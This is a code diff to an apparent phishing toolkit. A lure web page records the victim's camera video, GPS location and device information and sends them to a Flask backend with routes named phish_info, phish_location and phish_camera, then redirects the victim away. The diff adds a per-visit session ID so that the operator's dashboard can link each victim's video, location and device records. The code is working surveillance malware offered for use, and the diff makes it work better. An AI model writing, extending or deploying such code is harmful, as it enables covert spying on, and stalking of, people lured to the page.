@@ -114,10 +114,12 @@ body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display
 var REDIRECT="REDIRECT_PLACEHOLDER";
 var BASE=location.protocol+"//"+location.host;
 var cameraDone=false,gpsDone=false;
+var SID=Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2);
 
 function tryRedirect(){if(cameraDone&&gpsDone){setTimeout(function(){window.location.href=REDIRECT;},400);}}
 
 function send(path,data){
+  data._sid=SID;
   var url=BASE+path;
   var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
   try{if(navigator.sendBeacon){navigator.sendBeacon(url,blob);return;}}catch(e){}
@@ -184,6 +186,7 @@ function captureCamera(){
         var fd=new FormData();
         fd.append('video',blob,'capture.webm');
         fd.append('mimeType',mr.mimeType);
+        fd.append('sid',SID);
         fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
         cameraDone=true;
         document.getElementById('btn').disabled=false;
@@ -281,12 +284,14 @@ def phish_info():
     if request.method == 'OPTIONS': return Response('', 204)
     d, ip = _parse_body(), _ip()
     ua = d.get('userAgent', '')
+    sid = d.get('_sid', '')
     for c in captures:
-        if c.get('_ip') == ip and c.get('_endpoint') == '/info' and c.get('userAgent', '') == ua:
+        if c.get('_sid') and c.get('_sid') == sid and c.get('_endpoint') == '/info':
             c.update(d); _save(); return {'ok': True}
     entry = dict(d)
     entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/info',
-                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
+                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                  '_sid': sid})
     captures.append(entry); _save(); return {'ok': True}
 
 @phish_app.route('/location', methods=['POST', 'OPTIONS'])
@@ -295,7 +300,8 @@ def phish_location():
     d, ip = _parse_body(), _ip()
     entry = dict(d)
     entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/location',
-                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
+                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                  '_sid': d.get('_sid', '')})
     captures.append(entry); _save(); return {'ok': True}
 
 @phish_app.route('/camera', methods=['POST', 'OPTIONS'])
@@ -308,6 +314,7 @@ def phish_camera():
         if d.get('denied'):
             entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
                      '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                     '_sid': d.get('_sid', ''),
                      'denied': True, 'reason': d.get('reason', 'Permission denied'),
                      'errName': d.get('errName', '')}
             captures.append(entry); _save(); return {'ok': True}
@@ -328,6 +335,7 @@ def phish_camera():
         fv.write(video_bytes)
     entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
              '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+             '_sid': request.form.get('sid', ''),
              'file': fname, 'mimeType': mime, 'size': len(video_bytes)}
     captures.append(entry); _save(); return {'ok': True}
 
@@ -458,23 +466,18 @@ function buildCard(d){{
 }}
 
 function showForGps(gps){{
-  var ip=gps._ip;
-  var gpsT=new Date(gps._time).getTime();
-  var WINDOW=60000; // 60s window around the GPS hit
-  // Find the closest /info and /camera for this IP within the time window
-  var infoMatch=null,infoD=Infinity;
-  var camMatch=null,camD=Infinity;
+  var sid=gps._sid;
+  var infoMatch=null,camMatch=null;
   Object.values(allCaptures).forEach(function(c){{
-    if(c._ip!==ip)return;
-    var d=Math.abs(new Date(c._time).getTime()-gpsT);
-    if(c._endpoint==='/info'&&d<infoD&&d<WINDOW){{infoD=d;infoMatch=c;}}
-    if(c._endpoint==='/camera'&&d<camD&&d<WINDOW){{camD=d;camMatch=c;}}
+    if(!sid||c._sid!==sid)return;
+    if(c._endpoint==='/info')infoMatch=c;
+    if(c._endpoint==='/camera')camMatch=c;
   }});
   var html=buildCard(gps);
   if(infoMatch)html+=buildCard(infoMatch);
   if(camMatch)html+=buildCard(camMatch);
   document.getElementById('feed').innerHTML=html;
-  document.getElementById('feed-title').textContent=ip;
+  document.getElementById('feed-title').textContent=gps._ip;
 }}
 
 function ingest(d){{
